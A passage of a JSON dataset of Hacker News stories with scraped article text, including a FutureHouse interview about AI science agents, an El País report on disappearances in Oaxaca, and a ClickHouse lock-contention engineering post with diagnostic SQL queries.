this case is doing roughly half the throughput, which aligns with\nour relative expectations. But again, in absolute terms, Lucene’s handling these\nqueries in ~100ms, which is much, much higher than we expect.\n(C) How do the Lucene nightly benchmarks compare for (A) and (B)? This file\nshows some of the actual terms used. If they don’t line up, how might you\nexplain the discrepency?\nAnswered inline with (A) and (B).\n(D) Let’s imagine that we want title AND see and order the results by the last\nmodification date of each document. How long would you expect that to take?\nIf the postings are not stored in that order, we’d naively expect in the worst\ncase we’d need to sort roughly ~24Mb of memory, at\n5ms/Mb. This would land us in the\n5mb/mb * 24mb ~= 120ms query time ballpark.\nIn reality, this seems like an unintentional trick question. If ordered by last\nmodification date, they’d already be sorted in roughly that order, since new\ndocuments are inserted to the end of the list. Which means they’re already\nstored in roughly the right order, meaning our sort has to move far less bits\naround. Even if that wasn’t the case, we could store sorted list for just this\ncolumn, which e.g. Lucene allows with doc values.Subscribe through email, RSS or Twitter to new articles! 3,637 subscribersYou might also like...Using checksums to verify syncing 100M database recordsShitlist Driven DevelopmentNeural Network From ScratchInverted Index Performance and Merkle Tree SyncronizationIncrease HTTP Performance by Fitting In the Initial TCP Slow Start Window",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "cdda3cb35982651b",
    "title": {
      "en": "George Foreman has died",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://variety.com/2025/tv/news/george-foreman-boxer-infomercial-star-dies-1236345523/",
    "score": 305,
    "by": "wallflower",
    "time": 1742612169,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "17c46cd9ab091ed5",
    "title": {
      "en": "The Humans Building AI Scientists",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.asimov.press/p/futurehouse",
    "score": 65,
    "by": "surprisetalk",
    "time": 1742432818,
    "content": "Share this postAsimov PressMeet the Humans Building AI ScientistsCopy linkFacebookEmailNotesMoreDiscover more from Asimov PressScience and technology for a flourishing future. Website: press.asimov.comSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign inThe ColumnMeet the Humans Building AI ScientistsA look inside FutureHouse, a nonprofit research institute in San Francisco.Asimov PressMar 20, 202532Share this postAsimov PressMeet the Humans Building AI ScientistsCopy linkFacebookEmailNotesMore25ShareArticle voiceover1×0:00-22:28Audio playback is not supported on your browser. Please upgrade.The exterior of FutureHouse HQ in San Francisco.From inside an industrial facade in San Francisco’s Dogpatch neighborhood, a crow takes flight. This tool-using corvid is the chosen mascot of FutureHouse, a nonprofit determined to automate scientific discovery using AI agents that can generate hypotheses, connect existing findings, and even suggest experiments.Since its launch two years ago, FutureHouse has steadily rolled out a family of “crow”-themed tools for researchers. ChemCrow helps design and execute chemical reactions. WikiCrow compiles encyclopedia-style summaries of human proteins — including their structure and known functions — by drawing on thousands of papers. ContraCrow sifts through the literature to find contradictory claims. PaperQA and its successor, PaperQA2, enable users to query PDFs and glean reliable answers without “hallucinated” misinformation. LAB-Bench, their benchmarking suite, measures how well these agents handle real-world biological tasks. And Aviary — software explicitly designed “to give language models access to the same tools as human researchers” — has enabled open-source LLMs “to exceed human-level performance on two more of the lab-bench tasks: doing scientific literature research and reasoning about DNA constructs” with only “modest compute budgets.”Despite their varied uses, each tool revolves around a common principle: letting an AI system read and reason about biological data to accelerate discoveries.FutureHouse’s focus on the scientific literature is no accident, either. CEO Sam Rodriques has long lamented the state of publishing, writing that “the biomedical literature is vast and suffers from three problems: it does not lend itself to summarization in textbooks; it is unreliable by commission; and it is unreliable by omission.”Many other scientists share his view.The Allen Institute for AI introduced Semantic Scholar way back in 2015; it was among the earliest platforms to rank and predict research relevance with machine learning rather than raw citation counts. Elicit, launched in the fall of 2023, gained two hundred thousand users by word of mouth; it promised a “one-click literature review” that, in controlled tests, cut time in half for researchers sifting through papers. Meanwhile, OpenAI’s “Deep Research” is now offering automated assistance for tasks ranging from summarizing journal articles to generating experiment designs.While these tools move us closer to the ideal of frictionless access to biological knowledge, FutureHouse is aiming higher. The team wants not only to streamline access to the scientific literature but also to mine it for untapped research directions — “unknown unknowns” that could lead to breakthroughs. Their ten-year mission is to build semi-autonomous AIs for science, from predictive models that explore genetic variants to humanoid robots that could one day run entire experiments on their own.To learn more about FutureHouse’s ambitions, we sat down with co-founders Sam Rodriques and Andrew White.Andrew White and Sam Rodriques, co-founders of FutureHouse.A lot of your tools reference crows. What’s up with that?White: When I got started in this space around October 2022, I was red-teaming with GPT4. Around the same time, a paper called “Language Models are Stochastic Parrots” was circulating, and people were debating whether these models were just regurgitating their training data or truly reasoning. The analogy is appealing, and parrots are definitely known for mimicking speech. But what we saw was that pairing these language models with external tools made them much more accurate — a bit like crows, which can use tools to solve puzzles.In the work that led to ChemCrow,1 for instance, we found that giving the large language model access to calculators or chemistry software made its answers much better. So we kind of retconned a little bit to make “Crows” be agents that can interact with tools using natural language.Subscribe to Asimov Press. It’s free, forever.SubscribeFutureHouse launched a bit more than two years ago. When you first set out on this quest to build an AI scientist, what did you assume would be simple? And which problems turned out to be surprisingly difficult?Rodriques: The first thing I did when thinking of making an AI scientist — which was a little bit before ChatGPT came out in September 2022 — was to figure out what is easy for humans and which tasks are easy for AI models. A great example is flipping burgers; it’s relatively easy for humans, but pretty difficult for robots. Solving mathematical proofs, on the other hand, seems to be easier for AI models and more difficult for humans.Practically speaking, one thing we found difficult was creating the infrastructure for these agents and getting them access to data and various web sources. We’ve also been surprised, like many people, by how easy the cognitive work is for these models; they’re exceptionally good at both hypothesis generation and drawing conclusions.White: I thought that most things were going to be hard, actually. But it turns out that some of the hardest things have nothing to do with AI. Engineering and production work were unexpectedly difficult. Going from a demo in a Jupyter notebook (used to write Python code) to getting something that can run at scale is a lot of work.In January 2023, PaperQA was working quite well, but the scores against humans weren’t great; the model was only about half as good as humans. When we added better parsing, though, and built tools to better find open-access papers — so not even any breakthroughs on the algorithm itself — PaperQA almost doubled in performance. That took about one year of work.Making WikiCrow, where we were writing Wikipedia articles for every single protein-coding gene in the Human Genome, was also a ton of engineering work. We were writing 20,000 articles and each article consisted of five PaperQA calls. It was 100,000 calls in total. So one of the most challenging things was getting that to run in a reasonable amount of time.Sign up for Asimov Press!SubscribeWhat kinds of data are still needed to build your AI agents?Rodriques: Data is certainly a limiting factor right now. We need both better and more data on how humans do science, including recordings of how people actually talk about it. We have almost none of this kind of data, but it is crucial to build a human-level AI scientist.Alaboratory inside of FutureHouse HQ.How can we trust that the agents you’re building are giving reliable information? A person who speaks with enough authority, after all, is capable of convincing an expert despite gaps in their knowledge.Rodriques: That’s a great question. Similar to when you are talking to a human, they tell you what to do and they sound very authoritative — you as a scientist need to go and think about it and see if it's right. People who are trusting the models without thinking may also be the same people who are trusting other people without questioning them. People need to be critical and skeptical when it makes sense to.I’m optimistic that an AI scientist will help with reproducibility overall. Did you do the experiment that you said you did? Did you record all the variables in a way that you can report it in the way you did it? Obviously, if someone is making something up, it is going to be as hard for a model to detect as it would be for a human.Another kind of reproducibility, which I expect to be even more common, is where the data is real, but where you’ve analyzed it in some way that invalidates your hypothesis. Here’s an example:Say you conduct twenty analyses on your data until you find one with a p-value of less than 0.05. This is something where the agents we are building will be very helpful. You can say to the agent, “Hey! Here are some papers with an analysis, please reproduce it on this data.” It should be able to access the data and run the analysis to tell you if it reproduces. And it should be able to run twenty other analyses. If you can systematically run data analysis at scale, p-hacking is no longer an issue. Instead of reporting one p-value for 100 tests, you run 100 analyses and create a distribution of p-values. The distribution of p-values tells you much more about the data, too, especially if you know how correlated those statistical tests are compared to a single test.How are your autonomous science agents evaluated on tasks pertaining to the scientific literature? And how do they stack up against human scientists?White: We made LitQA because we needed something automatic and fast so we can iterate quickly. It’s like 250 questions that are very hard. Humans score about 67 percent and our latest models are at 90 percent. So we are well above humans — which are PhD-level professional biologists who are paid to answer and are incentivized to do well. Of course, that doesn’t represent real science, it’s more like trivia questions. We had WikiCrow write Wikipedia articles before pairing them up and blind-evaluating them. This is a good example of how we trained on trivia questions but ended up outperforming humans on general knowledge. As an organization, however, we want to measure our performance on novel scientific discoveries. That’s like our five-year KPI. We will know PaperQA is working well when it is integrated and contributing to discoveries. At the end of the day, as these models get closer and closer to humans, we will evaluate them like humans. What makes a good PhD student, for example? They come up with good ideas, scope them correctly, drive progress forward, and write a paper on them. That is eventually how we will evaluate these models. But just like how it is hard to evaluate a PhD student based on grades or a first-year exam, we won’t know how good these models are until we put them in the lab and see what they can come up with.FutureHouse is a non-profit research institute, but you are not a Focused Research Organization (FRO). What is the distinction, and do you foresee a for-profit offshoot in the future?Rodriques: I imagine that there will be a point where what we’ve made has so much commercial demand that you have to spin out a for-profit. It’s very common for non-profits to spin out for-profits. Universities do it all the time.FROs are non-profits that tackle projects too large for academia, but that cannot be done as a for-profit. In that sense, we are very much an FRO. The difference, though, is that when we first wrote down the FRO model, we specified a few things about how FROs work that did not apply to FutureHouse to make it palatable to a certain set of funders. FROs are funded for five years and we ask that they be funded at a particular scale. And they were really supposed to be milestone-driven. When we got started, the idea of building an AI scientist was a new and nebulous idea. We have a much better idea of what that means now. But at the time, it was difficult for us to write out clear milestones or objectives for FutureHouse, because we didn’t know what was going to happen. So now, our funding isn’t limited to five years and we are funded in a different way compared to FROs. This structure allows us to stay nimble.What are some misleading assumptions that people make about your work?Rodriques: Many people assume we’re focused on wet lab automation. There are certainly opportunities there and we are exploring them, but the biggest opportunities are actually on the cognitive side.We also contend with a lot of biosecurity assumptions. There is a community of people who are very concerned about biosecurity and some who assume that what we are building will be dangerous. I like to emphasize that, fundamentally in biology, you have to bring things into the world. Biosecurity is always a challenging question because our goal is to manipulate human biology to cure disease. If you can manipulate biology, you can also create things that are very dangerous. We think about it a lot.In terms of bringing things into the world: How are your wet lab automation efforts going?Rodriques: It’s not the main focus of our work, as I said. But AI models are going to be way better at it than we are, especially in cases where you have high-throughput wet lab automation. As a human scientist doing wet lab work, the hardest thing is often just remembering the dozens of different experimental conditions that are being tested at once. — but that’s what these AI systems are designed for.What we are interested in building is the cognition layer that goes on top of the actual experiments. Once you have an experiment you want to test, there are established methods — like design-of-experiments — that define the parameter space and help decide what to test.Put another way, what is really special about AI today is the fact that — with the language models — we are going to be able to apply AI to poorly structured spaces. When you’re in a well-structured space like the structure of protein sequences, DNA sequences, or even defined experimental spaces like chemical concentrations, there are lots of classic AI methods you can use to train a foundation model or Bayesian optimization. But when you are in a poorly defined space, like in natural language, where hypotheses can be explored for anything conceivable, traditional methods don’t work very well. This is why the revolution is really going to come from being able to apply AI to those poorly structured spaces. In a recent tweet, you showed off a humanoid robot sitting on a couch in your HQ. Why are you using humanoid robots instead of more conventional robots specifically designed for biology?Rodriques: There is a key distinction, in terms of automating biology, between one-off experiments and running experiments at scale. The tools required in each case are very different.Imagine you are building a car. There are two different regimes: Either you can be in the “I’ve never built a car before and I want to build one” regime or the “I’ve built a car before, but I want to build 100,000 cars” regime. If you want to produce 100,000 cars you build an assembly line with a bunch of specially-designed robots that each do one thing. If you want to change the size of the wheels you’re going to have to throw out some of the robots. God forbid you suddenly want to build a helicopter. There would be no chance, right?If you want to do the “I’ve never built a car before” you don’t do any of that. You don’t buy a bunch of robots. You buy a machine shop and you build the car as a one-off. When you are talking about basic discovery research, it’s just a bunch of one-off experiments — imagine a graduate student doing every experiment once and for the first time comes up with an amazing discovery. That’s the kind of science we want to automate and it isn’t compatible with huge robotic systems. Most of what we do right now is humans designing and performing experiments, so the next step is AI assisting these humans, and the future is general-purpose robotics guided by AI. We are interested in humanoid robots because they more closely map the kind of experimentation we are looking to emulate.In one of your essays, Sam, you wrote about how lab automation is difficult, in part, because robots can’t adapt to surprises. You discovered, in your laboratory, that a broken gasket was leaching a chemical into your cell cultures —unbeknownst to your team — that interfered with results. Will robots ever be able to diagnose and resolve problems like this?Rodriques: Using robots to run wet lab experiments is ultimately a sensing problem. The ability of humans to perceive things is very good. So much of biology is having a tube that you tilt up to the light in just the right way that you can see its contents. Just try and get a robot with a camera to do that. It's tough. And if you aren’t able to sense like that, something like a chemical leeching into an experiment is incredibly difficult to detect.Human sensory motor function is way more evolved than human cognition. Sensor motor function has been evolving since the Cambrian. That was 500 million years ago. Cognition, in the human sense, has been evolving for a few million years by comparison. It’s not surprising that AI models will match the levels of human cognition before we have robots and sensory systems that are as good as humans.Okay, last question. How are you getting your tools into the hands of scientists? How do you grow your community of users?Rodriques: We’re still trying to figure that out. The first thing to appreciate is that our mission here is to automate scientific research and scale scientific research. That’s the core goal. The idea is not to create productivity tools, but we want to make sure we keep building and don’t end up in a commercialization cycle. We don’t want the quality of the technology we are building to be affected by commercialization and that’s why we operate as a non-profit. The plan is to eventually launch a platform for people to use our tools. For the foreseeable future, though, the North Star is focused on building more capable agents because that’s where the value ultimately comes from.White: The end goal is to have a platform that runs scientific intelligence at a scale that is good enough to work on all genes, all proteins, all diseases.Interviews by Bryan Duoto. Photography by Xiaofan Fang. This article was edited for brevity and clarity.Cite: Duoto, B. \"Meet the Humans Building AI Scientists.\" Asimov Press (2025). DOI: 10.62211/42py-87ghLead image by Ella Watkins-Dulaney.1A large language model that plans and executes chemical synthesis steps. It was pre-printed in April 2023 and published in May 2024.Subscribe to Asimov PressScience and technology for a flourishing future. Website: press.asimov.comSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.32 Likes∙5 Restacks32Share this postAsimov PressMeet the Humans Building AI ScientistsCopy linkFacebookEmailNotesMore25SharePrevious",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "848c8869a89758eb",
    "title": {
      "en": "Horror on the coast of Oaxaca, a tourist paradise plagued by mass disappearances",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://english.elpais.com/international/2025-03-10/horror-on-the-coast-of-oaxaca-a-tourist-paradise-plagued-by-mass-disappearances.html",
    "score": 42,
    "by": "PaulHoule",
    "time": 1742666607,
    "content": "MEXICOHorror on the coast of Oaxaca, a tourist paradise plagued by mass disappearancesIn two months, 16 people have gone missing around Huatulco, Zipolite and Puerto Escondido, emblematic beaches of the Mexican Pacific. Nine bodies were found inside a car, but officials are giving no explanationsTourists at a bar in Mazunte, Oaxaca, Mexico, on March 8, 2025.Mónica González IslasBeatriz GuillénHuatulco (Mexico) - MAR 10, 2025 - 19:19 GMT+9Share on WhatsappShare on FacebookShare on TwitterShare on BlueskyShare on LinkedinCopy linkJaqueline Meza was taken from the paradisiacal beaches of Oaxaca a week ago. It was her mother who raised the alert: she was kidnapped while she was having dinner in a restaurant near the beach. Seven men disappeared from this same area in January. Another nine young men, at the end of February. Nothing has been heard of the first group. The bodies of the second group were found 250 miles away, in another state, inside an abandoned car. What happened in between remains a mystery, but the authorities have acknowledged that they are investigating possible involvement by the police. The crimes have shattered the idea of peace on this drop-dead gorgeous stretch of coastline. This holiday haven for artists, destination for two million tourists a year and a favorite spot for Instagram photos is now also the scene of brutal mass disappearances.Life goes on along the coast of Oaxaca, with the raging waves of the Pacific in the background. The usual routines go on at the beach: vendors offering massages, spicy peanuts, handmade earrings. In Zipolite, Mexico’s only official nudist beach, reggaeton and electronic music play in bars that are still running at low energy. These weeks represent a trough between the peaks of Christmas and Easter. But this year, in the interim, tragedy has struck. Between this town and Huatulco, 31 miles away, 10 people have gone missing. They were between 19 and 29 years old. Only one has been found alive.On February 28, Lesly Noya, 21, and Jaqueline Meza, 23, disappeared from Zipolite. So did Raúl González and his girlfriend Yamileth López, both 28. All of them were seen for the last time, according to their families, in this town of just 1,000 residents with a reputation for being bohemian and free. “Please, I ask for your help, my daughter disappeared last night, they took her and so far we know nothing,” pleaded Andrea Cazares, Jaqueline’s mother. This is how the message ended: “Two little ones, five and three years old, are waiting for her.”Some of the young people who went missing in Oaxaca: Rolando Evaristo, Rubén Antonio Ramos, Jacqueline Meza , Lesly Noya, Raúl Emmanuel González, Guillermo Cortes, Yamileth López and Angie Pérez.At about the same time, two other families were crying out in despair over their children’s fate in Huatulco, a paradise spot with nine bays that is considered one of the region’s jewels in the crown. The municipal police, they said, had taken Brenda Salas, 19, and Angie Pérez, 29. The agents had reportedly beaten them and taken them to another place, according to the request for help shared with journalists. Four more people went missing in the same approximate time period: Guillermo Cortés, Jonathan Uriel Calva, Marco Antonio Flores and Rolando Armando Evaristo, who were between 22 and 29 years old. It is not known where or when exactly they were taken.The 10 young people all came from Tlaxcala, in central Mexico, and lived in towns very close to one another (Apizaco, Santa Úrsula Zimatepec, Yauquemehcan). No one has confirmed whether they all knew each other before they were taken in Oaxaca. But what is certain is that their lives came together in the end. The bodies of nine of them were found inside a black Volkswagen, on the side of the highway that connects Oaxaca with Puebla. In a strange event that no authority has yet explained, the attackers left one survivor: Brenda Salas. It is more than a six-hour drive from where the youths were abducted to where their bodies were dropped off. How did the killers do it? Did they transport nine bodies for 250 miles or did they take them while they were still alive? If so, where were they killed? “How much power do you have to have to be able to drive across a state with a vehicle loaded with corpses? Or how much impunity?” asks a local journalist, who prefers not to give his name for security reasons.The bodies were placed exactly at the point where Oaxaca ends and the Mexican state of Puebla begins. The intention and effect of the transfer is not a coincidence: attention was diverted from the Oaxacan coast and also from its authorities. The bodies of the young people had not yet been returned to their families and Jesús Romero, Secretary of Government of Oaxaca, was already insisting to the press: “Huatulco is a safe destination for all families, for all Oaxacans, for all travelers, and there are all the conditions here to come and travel.”Tourists at a bar in Mazunte, Oaxaca, Mexico, on March 8, 2025.Mónica González IslasTourism is a driving force and a source of hope in this southern state, where 60% of the population lives in poverty (20%, almost 600,000 people, in extreme poverty). In Huatulco and Puerto Escondido alone, the two main attractions on this stretch of coast, 50,000 jobs depend on tourism. The economic impact left by visitors in 2024 exceeded 12.7 billion pesos (about $626 million), according to data from state tourism authorities.While tourists keep coming (including more and more foreigners), the governor of Oaxaca, Salomón Jara, from the political party Morena, recently boasted about the low crime rates. “It is the fifth state with the fewest crimes per 100,000 inhabitants,” the official boasted, deploying a narrative about effectiveness, meetings, team creation and coordination. This was on February 17, nine days before everything unraveled.The case has shocked the country, both because of its savagery and its strangeness. Oaxaca had so far stayed clear of the massacres that have devastated other areas of Mexico. There is no case here like that of the 43 missing students from Iguala (Guerrero), or that of the 72 migrants executed in San Fernando (Tamaulipas). In a country with 110,000 missing persons, only 746 went missing in this state, according to figures from the Ministry of the Interior. This registry, which lists people who have not been located since 1952, includes the seven people who disappeared in May 2024 in Puerto Escondido and seven more who vanished on their way to this town in early January. After them, there were the young people from Tlaxcala. That is to say: in less than a year, 25 people have vanished from these beaches, 16 of them in the last two months. The question comes back again and again: what is happening on the coast of Oaxaca?Aerial view of La Entrega beach in Huatulco, Oaxaca.Mónica González Islas“Zone of tolerance”This wild stretch of coastline is considered an arrival, storage and distribution zone for drugs en route to the rest of the country. Local residents talk about planes landing in the middle of the jungle and boats arriving at night with their shipments to the sand coves. Two weeks ago, the Navy seized a boat with more than 670 kilos of cocaine in Huatulco. How many make it through for every one that they catch? “It is a very important place for transit that until now had not recorded serious violent incidents,” says a reporter. Discretion is the best ally of drug trafficking.A businessman from the region describes it as “a zone of tolerance.” No one — neither the population nor the authorities — reports organized crime because the latter boast of “protecting and caring for” the area: they prohibit robberies and extortion, they do not approve of drugs such as crystal meth or the rape of women, they do not allow “excesses” because that scares away the tourists and disturbs business. This routine, which is neither new nor unique to the Oaxaca coast, allows criminal organizations to keep strengthening their tentacles: “It is like a power triad: drug dealers are businessmen, drug dealers are politicians, and drug dealers are drug dealers,” notes a local reporter.Aerial view of Santa Cruz Bay, Huatulco, Oaxaca, Mexico.Mónica González Islas11 murders in one weekendThe same day the boys disappeared, an environmental activist, Cristino Castro, was killed. He had spent his entire life defending his land, Barra de la Cruz, against the real estate developments that are fighting to turn this coast into the new Pacific Riviera, much as has already happened in Cancún, Playa del Carmen, Tulum, and even Acapulco. Also that weekend, a businessman from Huatulco, José Alfredo Lavariega, known as El Jocha, was found dead. His murder has been linked to the disappearance of the young men from Tlaxcala.Following the most recent disappearances, an old pattern has been repeated that was created by the government of Felipe Calderón in the so-called war on drugs: the criminalization of victims of forced disappearance. The justification is that if they were taken away, they were surely up to something: that if they were killed, they must have done something.A week after the kidnappings, there were no police or military personnel watching over Zipolite. Investigations into who and how the kidnappers were able to take 10 people are at a standstill. The official plan seems to be the same as always: wait until another tragedy takes place to draw attention away from what happened here. Meanwhile, the underground rivers continue to flow and the tourists keep coming, like an unconscious part of the scenery. They dance salsa and cumbia, they swim in the clean waters and walk naked on the sand, acting as if those who were taken were not, in reality, just like them.Sign up for our weekly newsletter to get more English-language news coverage from EL PAÍS USA EditionTu suscripción se está usando en otro dispositivo¿Quieres añadir otro usuario a tu suscripción?Añadir usuarioContinuar leyendo aquíSi continúas leyendo en este dispositivo, no se podrá leer en el otro.¿Por qué estás viendo esto?Flecha Tu suscripción se está usando en otro dispositivo y solo puedes acceder a EL PAÍS desde un dispositivo a la vez. Si quieres compartir tu cuenta, cambia tu suscripción a la modalidad Premium, así podrás añadir otro usuario. Cada uno accederá con su propia cuenta de email, lo que os permitirá personalizar vuestra experiencia en EL PAÍS.¿Tienes una suscripción de empresa? Accede aquí para contratar más cuentas.En el caso de no saber quién está usando tu cuenta, te recomendamos cambiar tu contraseña aquí.Si decides continuar compartiendo tu cuenta, este mensaje se mostrará en tu dispositivo y en el de la otra persona que está usando tu cuenta de forma indefinida, afectando a tu experiencia de lectura. Puedes consultar aquí los términos y condiciones de la suscripción digital.Sign up to EL PAÍS US Edition bulletinInternational El País in English on FacebookInternational El País in English on TwitterMore information‘El Mencho’ and ‘Don Rodo,’ a life of evading justice: From small-time dealers to heads of the most powerful cartel in MexicoAlejandro Santos Cid | MexicoDisappearance of eight young people and the silence of three states highlights opacity of crime in MexicoBeatriz Guillén | MexicoArchived InMexicoOaxacaClaudia SheinbaumFelipe CalderónAdheres toMore informationIf you are interested in licensing this content, click hereSponsored Content장기렌트 견적은 공짜입니다! 가격보고 결정하세요8zero렌트|PatrocinadoPatrocinado더 읽기Undo\"혈관 찌꺼기 방치하면 진짜 큰일나요\" ... 2주만에 빠르게 싹~ 청소 가능한 \"이것.\" [특허]카이스트 건강비결|PatrocinadoPatrocinado더 알아보기Undo로또 구매할 때, '이 방법' 으로 구매해보 세요.로또 연구소|PatrocinadoPatrocinado지금 보기UndoAnd Also...The couple deported to Colombia after 35 years in the USEl PaísUndoJD Vance and his wife booed upon arrival at Kenn edy CenterASUndoReporter accidentally bumps microphone into President Trump's faceASUndo\n      window._taboola = window._taboola || [];\n      _taboola.push({mode:'thumbs-feed-01',container:'taboola-below-article-thumbnails',placement:'Below Article Thumbnails',target_type:'mix'});\n    _Últimas noticias05:00Psychopharmaceuticals: 50 years of stagnation? 05:00Kaveh Akbar, writer: ‘Many readers use literature to feel like they’re one of the good ones’05:00Why everything looks the same everywhere05:00Robert Merry, historian: ‘Trump doesn’t recognize McKinley’s remarkable turnaround with regard to his views on tariffs’Most viewed‘Mexican Auschwitz’ opens its doors: ‘The only truth is that they don’t care about the missing’From glory to derision: 25 years of the concept album that ended The Smashing Pumpkins’ fameSurviving failure, stereotypes, and Bill Murray: The return of Lucy Liu, the star who almost reigned in HollywoodBruce Willis at 70, the film legend whose memory is fading and who is supported by seven womenThe couple deported to Colombia after 35 years in the US",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "9201e0b343cae4fe",
    "title": {
      "en": "‘The Celts: A Modern History’ by Ian Stewart Review",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.historytoday.com/archive/review/celts-modern-history-ian-stewart-review",
    "score": 102,
    "by": "lermontov",
    "time": 1742537284,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d51f7e766c5883db",
    "title": {
      "en": "Even the worst mass extinction had its oases",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arstechnica.com/science/2025/03/even-the-worst-mass-extinction-had-its-oases/",
    "score": 95,
    "by": "Hooke",
    "time": 1742361693,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "465b9edbf784649a",
    "title": {
      "en": "Claude can now search the web",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.anthropic.com/news/web-search",
    "score": 1187,
    "by": "meetpateltech",
    "time": 1742489472,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "b37da0c384f5a905",
    "title": {
      "en": "Lock Contention",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://maksimkita.com/blog/lock-contention.html",
    "score": 88,
    "by": "stacyz",
    "time": 1742230028,
    "content": "Lock Contention\n\n        17 Mar 2025\n\n    Overview\n\nRecently, I revisited Resolving a year-long ClickHouse lock contention post and spoke about it\nat C++ Russia 2025 conference.\n\nI wanted to provide more information about the development process and some technical details that were not covered in the original post.\n\nMotivation\n\nIn 2022 in Tinybird, there was a huge CPU underutilization in one of our clusters during the high load period.\n\nIt was unclear what was the issue. There were no IO/Network/Memory bottlenecks. In ClickHouse all async metrics and query profile events were normal.\nThe only unusual thing was that with increased queries throughput, ClickHouse could not handle the load, and CPU usage was very low.\n\nThe problem continued for a year and during similar incidents, we could not find any clues.\n\nOne year later during a similar incident, we spotted that ContextLockWait async metric periodically increased. Async metrics are calculated periodically with some interval and include for example memory usage, and some global metrics. Client can read them using system.asynchronous_metrics table. And one of such metrics is ContextLockWait, it tells you how many threads are waiting for a Context lock.\n\nIt is normal that during high load such metric can increase because of increased contention on Context lock. But it was very unusual because the normal value of this metric is around 0, so I started to investigate the issue from the ClickHouse internals side.\n\nDuring the incident, I periodically dumped all threads stack traces to understand how many threads were blocked on lock inside Context. It is possible to dump all threads stack traces in ClickHouse using system.stack_trace table and the following query:\n\nWITH arrayMap(x -> demangle(addressToSymbol(x)), trace) AS all\nSELECT thread_name, thread_id, query_id, arrayStringConcat(all, '\\n') AS res\nFROM system.stack_trace LIMIT 1 FORMAT Vertical;\n\nRow 1:\n──────\nthread_name: clickhouse-serv\nthread_id:   125441\nquery_id:\nres:         pthread_cond_wait\nstd::__1::condition_variable::wait(std::__1::unique_lock<std::__1::mutex>&)\nBaseDaemon::waitForTerminationRequest()\nDB::Server::main(/*arguments*/)\nPoco::Util::Application::run()\nDB::Server::run()\nPoco::Util::ServerApplication::run(int, char**)\nmainEntryClickHouseServer(int, char**)\nmain\n__libc_start_main\n_start\n\nEvery 10-15 seconds I dumped all threads stack traces to later check if there were any patterns where threads were spending time. After the incident, I was able to see that most of the threads were blocked on Context class methods that needed to take a Context lock, for example Context::getSettings().\n\nAfter that I was almost sure that the problem was in Context lock contention and started to investigate this particular lock.\n\nAdding ContextLockWaitMicroseconds\n\nIn ClickHouse there are per query profile events that are defined like this:\n\nM(GlobalThreadPoolJobs,\n  \"Counts the number of jobs that have been pushed to the global thread pool.\",\n  ValueType::Number) \\\n\nM(GlobalThreadPoolLockWaitMicroseconds,\n  \"Total time threads have spent waiting for locks in the global thread pool.\",\n  ValueType::Microseconds) \\\n\nM(GlobalThreadPoolJobWaitTimeMicroseconds,\n  \"Measures the elapsed time from when a job is scheduled in the thread pool to when it is picked up\n  for execution by a worker thread. This metric helps identify delays in job processing, indicating\n  the responsiveness of the thread pool to new tasks.\",\n  ValueType::Microseconds) \\\n\nM(LocalThreadPoolLockWaitMicroseconds,\n  \"Total time threads have spent waiting for locks in the local thread pools.\",\n   ValueType::Microseconds) \\\n\nAs you can see they can have different types like ValueType::Number or ValueType::Microseconds. We already have a lot of metrics for locks for which we can have heavy contention. For example,\nyou can see that there is GlobalThreadPoolLockWaitMicroseconds event that allows you to see how much time threads spend waiting for locks in the global thread pool. Unfortunately,\nfor Context lock we did not have a similar metric, we only had ContextLock event that tells you how many times the Context lock was acquired or tried to acquire. It is not enough to\nunderstand if there is a problem with Context lock contention, because it is expected that query can take this lock many times during query execution to read query settings, query current database, etc. We need a metric that tells us how much time threads in the query spend waiting for a Context lock, similar to the GlobalThreadPoolLockWaitMicroseconds event.\n\nThe first step was to add the ContextLockWaitMicroseconds event to profile events in https://github.com/ClickHouse/ClickHouse/pull/55029:\n\nM(ContextLock,\n    \"Number of times the lock of Context was acquired or tried to acquire. This is global lock.\",\n    ValueType::Number) \\\n\nM(ContextLockWaitMicroseconds,\n    \"Context lock wait time in microseconds\",\n    ValueType::Microseconds) \\\n\nDuring the development of the pull request, I already discovered that the problem was in the Context lock because I was able to reproduce performance issue locally using the ContextLockWaitMicroseconds metric to track the amount of time threads in the query spend waiting for the Context lock.\n\nI took an example query that takes 5 milliseconds to execute:\nSELECT UserID, count(*) FROM (SELECT * FROM hits_clickbench LIMIT 10) GROUP BY UserID\n0 rows in set. Elapsed: 0.005 sec.\n\nAnd tried to run 200 such queries concurrently for a couple of minutes:\nclickhouse-benchmark --query=\"SELECT UserID, count(*) FROM (SELECT * FROM hits_clickbench LIMIT 10)\nGROUP BY UserID\" --concurrency=200\n\nAnd checked the results:\nSELECT quantileExact(0.5)(lock_wait_milliseconds), max(lock_wait_milliseconds) FROM\n(\n    SELECT (ProfileEvents['ContextLockWaitMicroseconds'] / 1000.0) AS lock_wait_milliseconds\n    FROM system.query_log WHERE lock_wait_milliseconds > 0\n)\n\n┌─quantileExact(0.5)(lock_wait_milliseconds)─┬─max(lock_wait_milliseconds)──┐\n│                                     17.452 │                      382.326 │\n└────────────────────────────────────────────┴──────────────────────────────┘\n\nAs you can see, some queries wait for the Context lock for 382 milliseconds, and the median wait time is 17 milliseconds, which is unacceptable.\n\nContext Lock Redesign\n\nThere are actually two types of Context in ClickHouse:\n\n    ContextSharedPart is responsible for storing and providing access to global shared objects that are shared between all sessions and 